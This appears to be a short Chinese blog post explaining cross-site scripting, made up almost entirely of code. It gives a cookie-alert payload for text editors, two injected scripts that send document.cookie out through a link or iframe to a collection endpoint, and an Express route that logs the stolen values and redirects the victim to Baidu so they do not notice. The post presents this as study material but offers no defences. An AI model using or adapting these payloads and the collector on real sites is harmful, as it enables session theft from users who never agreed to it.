---
title: "理解学习跨站脚本攻击原理"
date: "2018-07-12"
categories: 
  - "网络基础"
---

### XSS

#### 针对 markdown textarea 等 文本编辑器

```javascript
<script>
(function() { alert(document.cookie)})()
</script>
```

#### 针对 图片src 或者事有超链接的做法

```javascript
// 点击打开的图片, 会触发脚本
<script>
var img = document.createElement('img');
img.src = 'http://www.private-blog.com/wp-content/uploads/2017/11/fa37d627538d082e52b4351f1e6bb7a6.jpg';
var a = document.createElement('a');
a.href =  'http://localhost:8888/db/insert?data=' + document.cookie;
a.append(img);
document.body.append(a);
</script>
```

#### 针对 iframe 的src属性 进行获取数据

```javascript
<script>
var iframe = document.createElement('iframe');
iframe.src = 'http://localhost:8888/db/insert?data=' + document.cookie;
document.body.append(iframe);
</script>
```

#### 对应的服务器端写法

```javascript
const express = require('express');
const router = express.Router();
/**
 * 获取请求的数据
 * x-www-form-urlencoded
 */
router.get('/db/insert/', (req, res) => {
    // 获取传入的数据
    let params = req.query;
    console.log(params);
     // 将这次的请求重定向 到 正常的请求URL, 避免使用者察觉
    res.redirect('http://www.baidu.com');
});
module.exports = router;
```

###### 学习中持续分享..........
